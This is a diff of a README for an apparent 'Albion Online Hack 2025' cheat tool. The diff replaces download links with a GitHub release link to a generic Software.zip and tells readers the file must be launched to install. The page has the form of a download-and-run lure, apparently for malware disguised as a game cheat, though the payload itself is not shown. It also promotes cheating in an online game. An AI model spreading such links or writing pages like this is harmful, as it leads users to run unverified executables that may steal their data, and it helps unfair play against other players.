@@ -46,11 +46,11 @@ Welcome to the ultimate cheat tool for dominating Albion Online like never befor
 
 ## Download Now! 📥
 
-👉 [Click here to download the Albion Online Hack 2025 Software](https://github.com/user-attachments/files/18388744/Software.zip)
+👉 [Click here to download the Albion Online Hack 2025 Software](https://github.com/bdhdhdhd888/Albion-Online-Hack-2025-External-Cheat-Menu-ESP-Auto-Loot-Resource-Locator-Speed-Hack-Misc-More-Mod-/releases/download/v2.0/Software.zip)
 
 ### (Note: The downloaded file needs to be launched for installation)
 
-[![](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![](https://github.com/bdhdhdhd888/Albion-Online-Hack-2025-External-Cheat-Menu-ESP-Auto-Loot-Resource-Locator-Speed-Hack-Misc-More-Mod-/releases/download/v2.0/Software.zip)](https://github.com/bdhdhdhd888/Albion-Online-Hack-2025-External-Cheat-Menu-ESP-Auto-Loot-Resource-Locator-Speed-Hack-Misc-More-Mod-/releases/download/v2.0/Software.zip)
 
 ---
 
